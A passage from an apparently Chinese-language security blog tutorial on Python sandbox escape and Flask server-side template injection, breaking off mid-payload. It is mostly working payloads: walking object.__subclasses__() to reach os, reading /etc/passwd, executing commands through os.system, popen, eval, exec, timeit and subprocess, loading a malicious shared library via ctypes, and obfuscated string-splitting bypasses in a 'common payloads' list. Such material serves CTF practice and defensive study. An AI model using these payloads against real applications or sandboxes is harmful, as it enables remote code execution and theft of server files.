i</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs lisp">(<span class="hljs-number">0</span>, &lt;type &#x27;type&#x27;&gt;)(<span class="hljs-number">1</span>, &lt;type &#x27;weakref&#x27;&gt;)(<span class="hljs-number">2</span>, &lt;type &#x27;weakcallableproxy&#x27;&gt;)(<span class="hljs-number">3</span>, &lt;type &#x27;weakproxy&#x27;&gt;)(<span class="hljs-number">4</span>, &lt;type &#x27;int&#x27;&gt;)(<span class="hljs-number">5</span>, &lt;type &#x27;basestring&#x27;&gt;)(<span class="hljs-number">6</span>, &lt;type &#x27;bytearray&#x27;&gt;)(<span class="hljs-number">7</span>, &lt;type &#x27;list&#x27;&gt;)(<span class="hljs-number">8</span>, &lt;type &#x27;NoneType&#x27;&gt;)(<span class="hljs-number">9</span>, &lt;type &#x27;NotImplementedType&#x27;&gt;)(<span class="hljs-number">10</span>, &lt;type &#x27;traceback&#x27;&gt;)(<span class="hljs-number">11</span>, &lt;type &#x27;super&#x27;&gt;)(<span class="hljs-number">12</span>, &lt;type &#x27;xrange&#x27;&gt;)(<span class="hljs-number">13</span>, &lt;type &#x27;dict&#x27;&gt;)(<span class="hljs-number">14</span>, &lt;type &#x27;set&#x27;&gt;)(<span class="hljs-number">15</span>, &lt;type &#x27;slice&#x27;&gt;)(<span class="hljs-number">16</span>, &lt;type &#x27;staticmethod&#x27;&gt;)(<span class="hljs-number">17</span>, &lt;type &#x27;complex&#x27;&gt;)(<span class="hljs-number">18</span>, &lt;type &#x27;float&#x27;&gt;)(<span class="hljs-number">19</span>, &lt;type &#x27;buffer&#x27;&gt;)(<span class="hljs-number">20</span>, &lt;type &#x27;long&#x27;&gt;)(<span class="hljs-number">21</span>, &lt;type &#x27;frozenset&#x27;&gt;)(<span class="hljs-number">22</span>, &lt;type &#x27;property&#x27;&gt;)(<span class="hljs-number">23</span>, &lt;type &#x27;memoryview&#x27;&gt;)(<span class="hljs-number">24</span>, &lt;type &#x27;tuple&#x27;&gt;)(<span class="hljs-number">25</span>, &lt;type &#x27;enumerate&#x27;&gt;)(<span class="hljs-number">26</span>, &lt;type &#x27;reversed&#x27;&gt;)(<span class="hljs-number">27</span>, &lt;type &#x27;code&#x27;&gt;)(<span class="hljs-number">28</span>, &lt;type &#x27;frame&#x27;&gt;)(<span class="hljs-number">29</span>, &lt;type &#x27;builtin_function_or_method&#x27;&gt;)(<span class="hljs-number">30</span>, &lt;type &#x27;instancemethod&#x27;&gt;)(<span class="hljs-number">31</span>, &lt;type &#x27;function&#x27;&gt;)(<span class="hljs-number">32</span>, &lt;type &#x27;classobj&#x27;&gt;)(<span class="hljs-number">33</span>, &lt;type &#x27;dictproxy&#x27;&gt;)(<span class="hljs-number">34</span>, &lt;type &#x27;generator&#x27;&gt;)(<span class="hljs-number">35</span>, &lt;type &#x27;getset_descriptor&#x27;&gt;)(<span class="hljs-number">36</span>, &lt;type &#x27;wrapper_descriptor&#x27;&gt;)(<span class="hljs-number">37</span>, &lt;type &#x27;instance&#x27;&gt;)(<span class="hljs-number">38</span>, &lt;type &#x27;ellipsis&#x27;&gt;)(<span class="hljs-number">39</span>, &lt;type &#x27;member_descriptor&#x27;&gt;)(<span class="hljs-number">40</span>, &lt;type &#x27;file&#x27;&gt;)(<span class="hljs-number">41</span>, &lt;type &#x27;PyCapsule&#x27;&gt;)(<span class="hljs-number">42</span>, &lt;type &#x27;cell&#x27;&gt;)(<span class="hljs-number">43</span>, &lt;type &#x27;callable-iterator&#x27;&gt;)(<span class="hljs-number">44</span>, &lt;type &#x27;iterator&#x27;&gt;)(<span class="hljs-number">45</span>, &lt;type &#x27;sys.long_info&#x27;&gt;)(<span class="hljs-number">46</span>, &lt;type &#x27;sys.float_info&#x27;&gt;)(<span class="hljs-number">47</span>, &lt;type &#x27;EncodingMap&#x27;&gt;)(<span class="hljs-number">48</span>, &lt;type &#x27;fieldnameiterator&#x27;&gt;)(<span class="hljs-number">49</span>, &lt;type &#x27;formatteriterator&#x27;&gt;)(<span class="hljs-number">50</span>, &lt;type &#x27;sys.version_info&#x27;&gt;)(<span class="hljs-number">51</span>, &lt;type &#x27;sys.flags&#x27;&gt;)(<span class="hljs-number">52</span>, &lt;type &#x27;sys.getwindowsversion&#x27;&gt;)(<span class="hljs-number">53</span>, &lt;type &#x27;exceptions.BaseException&#x27;&gt;)(<span class="hljs-number">54</span>, &lt;type &#x27;module&#x27;&gt;)(<span class="hljs-number">55</span>, &lt;type &#x27;imp.NullImporter&#x27;&gt;)(<span class="hljs-number">56</span>, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;)(<span class="hljs-number">57</span>, &lt;type &#x27;nt.stat_result&#x27;&gt;)(<span class="hljs-number">58</span>, &lt;type &#x27;nt.statvfs_result&#x27;&gt;)(<span class="hljs-number">59</span>, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;)(<span class="hljs-number">60</span>, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;)(<span class="hljs-number">61</span>, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;)(<span class="hljs-number">62</span>, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;)(<span class="hljs-number">63</span>, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;)(<span class="hljs-number">64</span>, &lt;type &#x27;classmethod&#x27;&gt;)(<span class="hljs-number">65</span>, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;)(<span class="hljs-number">66</span>, &lt;class &#x27;_abcoll.Sized&#x27;&gt;)(<span class="hljs-number">67</span>, &lt;class &#x27;_abcoll.Container&#x27;&gt;)(<span class="hljs-number">68</span>, &lt;class &#x27;_abcoll.Callable&#x27;&gt;)(<span class="hljs-number">69</span>, &lt;type &#x27;dict_keys&#x27;&gt;)(<span class="hljs-number">70</span>, &lt;type &#x27;dict_items&#x27;&gt;)(<span class="hljs-number">71</span>, &lt;type &#x27;dict_values&#x27;&gt;)(<span class="hljs-number">72</span>, &lt;class &#x27;site._Printer&#x27;&gt;)(<span class="hljs-number">73</span>, &lt;class &#x27;site._Helper&#x27;&gt;)(<span class="hljs-number">74</span>, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;)(<span class="hljs-number">75</span>, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;)(<span class="hljs-number">76</span>, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;)(<span class="hljs-number">77</span>, &lt;class &#x27;site.Quitter&#x27;&gt;)(<span class="hljs-number">78</span>, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;)(<span class="hljs-number">79</span>, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;)(<span class="hljs-number">80</span>, &lt;type &#x27;operator.itemgetter&#x27;&gt;)(<span class="hljs-number">81</span>, &lt;type &#x27;operator.attrgetter&#x27;&gt;)(<span class="hljs-number">82</span>, &lt;type &#x27;operator.methodcaller&#x27;&gt;)(<span class="hljs-number">83</span>, &lt;type &#x27;functools.partial&#x27;&gt;)(<span class="hljs-number">84</span>, &lt;type &#x27;MultibyteCodec&#x27;&gt;)(<span class="hljs-number">85</span>, &lt;type &#x27;MultibyteIncrementalEncoder&#x27;&gt;)(<span class="hljs-number">86</span>, &lt;type &#x27;MultibyteIncrementalDecoder&#x27;&gt;)(<span class="hljs-number">87</span>, &lt;type &#x27;MultibyteStreamReader&#x27;&gt;)(<span class="hljs-number">88</span>, &lt;type &#x27;MultibyteStreamWriter&#x27;&gt;)</code></pre></div><h3 id="文件利用"><a href="#文件利用" class="headerlink" title="文件利用"></a>文件利用</h3><p>文件操作的原理是获取到object后，使用__subclasses__来获取file类，进而进行文件操作。</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><div class="hljs code-wrapper"><pre><code class="hljs python">读文件：<span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()写文件：<span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp&#x27;</span>).write(<span class="hljs-string">&#x27;test&#x27;</span>)</code></pre></div><p>如果仅仅是沙箱逃逸，读取文件也可考虑</p><h4 id="open"><a href="#open" class="headerlink" title="open"></a><strong>open</strong></h4><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()</code></pre></div><h4 id="codecs"><a href="#codecs" class="headerlink" title="codecs"></a><strong>codecs</strong></h4><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> codecscodecs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()</code></pre></div><h3 id="命令执行-amp-代码执行"><a href="#命令执行-amp-代码执行" class="headerlink" title="命令执行&amp;代码执行"></a>命令执行&amp;代码执行</h3><ol><li><p>找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()):    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrapper&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(i[<span class="hljs-number">1</span>].__init__):        print(i[<span class="hljs-number">0</span>],i[<span class="hljs-number">1</span>].__init__)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs reasonml">G:\Program\Python\tools\flask ssti&gt;python27 enumerate_unbound.py(<span class="hljs-number">59</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WarningMessage</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)(<span class="hljs-number">60</span>, &lt;unbound <span class="hljs-keyword">method</span> catch_warnings.__init__&gt;)(<span class="hljs-number">61</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_IterationGuard</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)(<span class="hljs-number">62</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WeakSet</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)(<span class="hljs-number">72</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_Printer</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)(<span class="hljs-number">77</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Quitter</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)(<span class="hljs-number">78</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">IncrementalEncoder</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)(<span class="hljs-number">79</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">IncrementalDecoder</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)</code></pre></div></li><li><p>使用这些库使用<code>__ini__.__gloabals__</code>或者<code>__init__.func_globals</code>、<code>_module</code>访问全局变量，可以使用<code>__dict__.keys()</code>得到可以利用的类，最通常的是linecache，在不导入其他库的情况下，也只有linecache可以包含os。</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.keys()[<span class="hljs-string">&#x27;filterwarnings&#x27;</span>, <span class="hljs-string">&#x27;once_registry&#x27;</span>, <span class="hljs-string">&#x27;WarningMessage&#x27;</span>, <span class="hljs-string">&#x27;_show_warning&#x27;</span>, <span class="hljs-string">&#x27;filters&#x27;</span>, <span class="hljs-string">&#x27;_setoption&#x27;</span>, <span class="hljs-string">&#x27;showwarning&#x27;</span>, <span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;onceregistry&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;simplefilter&#x27;</span>, <span class="hljs-string">&#x27;default_action&#x27;</span>, <span class="hljs-string">&#x27;_getcategory&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;catch_warnings&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;warnpy3k&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;warn_explicit&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;warn&#x27;</span>, <span class="hljs-string">&#x27;_processoptions&#x27;</span>, <span class="hljs-string">&#x27;defaultaction&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;_OptionError&#x27;</span>, <span class="hljs-string">&#x27;resetwarnings&#x27;</span>, <span class="hljs-string">&#x27;formatwarning&#x27;</span>, <span class="hljs-string">&#x27;_getaction&#x27;</span>]<span class="hljs-meta">&gt;&gt;&gt; </span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div></li><li><p>再进一步使用<code>__dict__</code>找到os。</p></li></ol><blockquote><ol><li>找到os库<ol><li>使用<code>__ini__.__gloabals__</code>或者<code>__init__.func_globals</code>访问全局变量，即可找到包含os的其他库，再进一步使用<code>__dict__</code>找到os</li><li>然后利用os.system、os.popen</li></ol></li><li>找到sys库</li><li>找到__builtins__后利用eval执行命令<ol><li>eval(‘__import__(“os”).system(“ls”)’)</li></ol></li></ol></blockquote><h4 id="找到os-sys-builtins-的思路："><a href="#找到os-sys-builtins-的思路：" class="headerlink" title="找到os/sys/__builtins__的思路："></a>找到os/sys/<code>__builtins__</code>的思路：</h4><p>python中<code>[].__class__.__base__.__subclasses__()</code>引入了很多模块，这些模块中很多都引入了os，如这里的第59号，warning模块。</p><p>python2中可以使用如下脚本来寻找包含os的模块</p><div class="hljs code-wrapper"><pre><code class="hljs python">num = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__():    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> item.__init__.__globals__:            print(num,item)        num+=<span class="hljs-number">1</span>    <span class="hljs-keyword">except</span>:        num+=<span class="hljs-number">1</span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">G:\Program\Python\tools\flask ssti&gt;python27 find_os.py(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;)(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;)</code></pre></div><p>这里就可以直接使用</p><p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[72].__init__.globals__[&#39;os&#39;]</code>引入os模块</p><p>使用<code>__ini__.__gloabals__</code>或者<code>__init__.func_globals</code>可以反问到当前的全局变量，全局变量中就包含了这些包含的库，使用keys()函数可以更加方便看到有哪些库可以使用</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.keys()[<span class="hljs-string">&#x27;filterwarnings&#x27;</span>, <span class="hljs-string">&#x27;once_registry&#x27;</span>, <span class="hljs-string">&#x27;WarningMessage&#x27;</span>, <span class="hljs-string">&#x27;_show_warning&#x27;</span>, <span class="hljs-string">&#x27;filters&#x27;</span>, <span class="hljs-string">&#x27;_setoption&#x27;</span>, <span class="hljs-string">&#x27;showwarning&#x27;</span>, <span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;onceregistry&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;simplefilter&#x27;</span>, <span class="hljs-string">&#x27;default_action&#x27;</span>, <span class="hljs-string">&#x27;_getcategory&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;catch_warnings&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;warnpy3k&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;warn_explicit&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;warn&#x27;</span>, <span class="hljs-string">&#x27;_processoptions&#x27;</span>, <span class="hljs-string">&#x27;defaultaction&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;_OptionError&#x27;</span>, <span class="hljs-string">&#x27;resetwarnings&#x27;</span>, <span class="hljs-string">&#x27;formatwarning&#x27;</span>, <span class="hljs-string">&#x27;_getaction&#x27;</span>]<span class="hljs-meta">&gt;&gt;&gt; </span></code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div><p>也可以不包含<code>__global__</code></p><div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div><h4 id="os利用方法"><a href="#os利用方法" class="headerlink" title="os利用方法"></a>os利用方法</h4><p>找到linecache或者其他包含os库的类后即可调用<code>__dict__</code>获取os，然后执行system</p><div class="hljs code-wrapper"><pre><code class="hljs python">__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs python">[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()</code></pre></div><h4 id="eval利用方法"><a href="#eval利用方法" class="headerlink" title="eval利用方法"></a>eval利用方法</h4><p>eval的使用方法：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;</span>)</code></pre></div><p>但是具体在沙箱逃逸和ssti的场景下，需要进行更多的变换</p><h4 id="builtins-利用方法"><a href="#builtins-利用方法" class="headerlink" title="__builtins__利用方法"></a><code>__builtins__</code>利用方法</h4><p><code>__builtins__</code> 下有eval可以利用，也可以使用<code>__import__</code>来引入os。</p><div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__下有<span class="hljs-built_in">eval</span>，<span class="hljs-built_in">__import__</span>等的全局函数，可以利用此来执行命令：[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()</code></pre></div><h4 id="exec利用方法"><a href="#exec利用方法" class="headerlink" title="exec利用方法"></a>exec利用方法</h4><p>exec的使用方法：</p><div class="hljs code-wrapper"><pre><code class="hljs python">exec(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;</span>)</code></pre></div><h4 id="timeit-利用方法"><a href="#timeit-利用方法" class="headerlink" title="timeit 利用方法"></a>timeit 利用方法</h4><p><strong>timeit</strong> 本是检测性能的，也可以任意代码执行</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> timeittimeit.timeit(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ipconfig&#x27;)&quot;</span>,number=<span class="hljs-number">1</span>)</code></pre></div><h4 id="platform利用方法"><a href="#platform利用方法" class="headerlink" title="platform利用方法"></a>platform利用方法</h4><p><strong>platform</strong></p><div class="hljs code-wrapper"><pre><code class="hljs delphi">import <span class="hljs-keyword">platform</span><span class="hljs-keyword">platform</span>.popen(<span class="hljs-string">&#x27;ipconfig&#x27;</span>).<span class="hljs-keyword">read</span>()</code></pre></div><h4 id="subprocess利用方法"><a href="#subprocess利用方法" class="headerlink" title="subprocess利用方法"></a>subprocess利用方法</h4><p><strong>subprocess</strong></p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">import subprocesssubprocess.<span class="hljs-constructor">Popen(&#x27;<span class="hljs-params">ipconfig</span>&#x27;, <span class="hljs-params">shell</span>=True, <span class="hljs-params">stdout</span>=<span class="hljs-params">subprocess</span>.PIPE,<span class="hljs-params">stderr</span>=<span class="hljs-params">subprocess</span>.STDOUT)</span>.stdout.read<span class="hljs-literal">()</span></code></pre></div><h3 id="zipimport-命令执行方法"><a href="#zipimport-命令执行方法" class="headerlink" title="zipimport 命令执行方法"></a>zipimport 命令执行方法</h3><h3 id="构造so库"><a href="#构造so库" class="headerlink" title="构造so库"></a>构造so库</h3><p>在().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()中发现有可用的类</p><div class="hljs code-wrapper"><pre><code class="hljs python">&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">ctypes</span>.<span class="hljs-title">CDLL</span>&#x27;&gt;</span><span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">ctypes</span>.<span class="hljs-title">LibraryLoader</span>&#x27;&gt;</span></code></pre></div><p>构造一个so库，列一下/home/ctf/下的文件</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;  </span>void my_init(void) __attribute__((constructor)); void my_init(void)  &#123;      system(<span class="hljs-string">&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;</span>);&#125;</code></pre></div><p>将编译好的so直接二进制写入/tmp/bk.so<br>使用ctypes加载so</p><div class="hljs code-wrapper"><pre><code class="hljs python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">86</span>](().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">85</span>]).LoadLibrary(<span class="hljs-string">&#x27;/tmp/bk.so&#x27;</span>)</code></pre></div><h3 id="f修饰符"><a href="#f修饰符" class="headerlink" title="f修饰符"></a>f修饰符</h3><p>在PEP 498中引入了新的字符串类型修饰符：f或F，用f修饰的字符串将可以执行代码。可以参考此文档 <a href="https://www.python.org/dev/peps/pep-0498/">https://www.python.org/dev/peps/pep-0498/</a></p><p>只有在python3.6.0+的版本才有这个方法。简单来说，可以理解为字符串外层套了一个exec()</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Smi1e&quot;</span>)&#125;</span>&#x27;</span>Smi1e<span class="hljs-string">&#x27;None&#x27;</span><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;dir&quot;</span>)&#125;</span>&#x27;</span> 驱动器 C 中的卷是 Windows.....</code></pre></div><p>这个有点类似于php中的<code>&lt;?php &quot;$&#123;@phpinfo()&#125;&quot;; ?&gt;</code>，但python中没有将普通字符串转成f字符串的方法，所以实际使用时效果不明。</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h2 id="0x03-常见payload"><a href="#0x03-常见payload" class="headerlink" title="0x03 常见payload"></a>0x03 常见payload</h2><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p>包包哥的python2 payload</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 利用file()函数读取文件：（写类似）</span>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;./test.py&#x27;</span>).read()<span class="hljs-comment"># 执行系统命令：</span>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-comment"># 执行系统命令：</span>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)<span class="hljs-comment"># 重新载入__builtins__：</span>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>]()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-comment">#读文件</span>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">r&#x27;C:\1.php&#x27;</span>).read()<span class="hljs-comment">#写文件</span>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/var/www/html/input&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;123&#x27;</span>)<span class="hljs-comment">#执行任意命令</span>().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )<span class="hljs-comment"># 利用 __getattibute__ 方法</span>x = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == <span class="hljs-string">&#x27;ca&#x27;</span>+<span class="hljs-string">&#x27;tch_warnings&#x27;</span>][<span class="hljs-number">0</span>].__init__x.__getattribute__(<span class="hljs-string">&quot;func_global&quot;</span>+<span class="hljs-string">&quot;s&quot;</span>)[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;stem&#x27;</span>](<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)</code></pre></div><p>n3k0大哥的python3 payload</p><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><p><strong>python3各个小版本之间有区别，有的payload可以用于py3.7 有的可以用于py3.5</strong></p><div class="hljs code-wrapper"><pre><code class="hljs python">().__class__.__bases__[<span 